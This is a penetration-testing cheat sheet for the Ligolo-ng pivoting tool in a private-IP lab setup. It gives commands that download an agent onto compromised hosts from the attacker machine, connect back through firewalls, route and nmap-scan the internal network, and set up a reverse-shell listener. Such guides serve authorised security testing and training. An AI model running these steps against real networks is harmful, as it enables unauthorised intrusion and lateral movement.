# Ligolo-ng – Pivoting & Internal Network Access

Ligolo-ng is a lightweight userland VPN pivoting tool that allows routing traffic through a compromised host into internal networks.

Unlike SOCKS-based tools (e.g., Chisel), Ligolo-ng creates a **TUN interface**, providing **Layer-3 (TCP & UDP)** access.

---

## Key Features

- Full **TCP & UDP** support  
- Reverse connection (bypasses inbound firewall rules)  
- Multiple pivot chaining (double / triple pivot)  
- Access to agent localhost (`127.0.0.1`)  
- Stable, stealthy, and ideal for internal network penetration testing  

---

## References

- GitHub: https://github.com/nicocha30/ligolo-ng  
- Pivoting Guide: https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5  

---

## Network Layout

| Role | IP Address | Description |
|------|-----------|-------------|
| Attacker | `192.168.1.7` | Kali Linux (Ligolo Proxy) |
| Pivot Hosts | `192.168.1.101`, `192.168.1.103` | Compromised systems |
| Internal Network | `192.168.2.0/24` | Network behind pivot |

---

## Installation (Kali Linux)


    apt update
    apt install ligolo-ng

## Verify Installation

    ligolo-proxy --version

## Attacker Setup (Proxy)
### Create TUN Interface

    ip tuntap add user root mode tun ligolo
    ip link set ligolo up

### Verify

    ip link show ligolo

### Start Ligolo Proxy

    ligolo-proxy -selfcert -laddr 0.0.0.0:443

### Verify Listener

    ss -nltp | grep 443

## Target Setup (Agent)
### Windows Agent

    Invoke-WebRequest http://192.168.1.7/agent.exe -OutFile C:\Users\Public\agent.exe
    Invoke-WebRequest "http://192.168.1.7/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"

### Run Agent (Windows)

    agent.exe -connect 192.168.1.7:443 -ignore-cert

### Linux Agent

    chmod +x agent
    ./agent -connect 192.168.1.7:443 -ignore-cert

## Session Management (Attacker)
### List Active Sessions

    session

### Select Session

    session <id>

### Start Tunnel

    start
⚠️ Tunnel must be started before routing works.

## Routing Internal Network

    ip route add 192.168.2.0/24 dev ligolo

### Verify Route

    ip route | grep ligolo

### Test Connectivity

    ping 192.168.2.10

## Scanning Through Pivot

    nmap -sT -Pn -p- 192.168.2.10

### HTTP Test

    curl http://192.168.2.100
## Access Agent Localhost (127.0.0.1)
Ligolo maps agent localhost to CIDR 240.0.0.0/4.

    ip route add 240.0.0.1/32 dev ligolo
Scan: 
    nmap -sT -p- 240.0.0.1
Browser Access

    http://240.0.0.1

## Port Forwarding (Listeners)
Add Listener

    listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

List Listeners
    listener_list

### Reverse Shell via Ligolo
Listener (Ligolo)

    listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
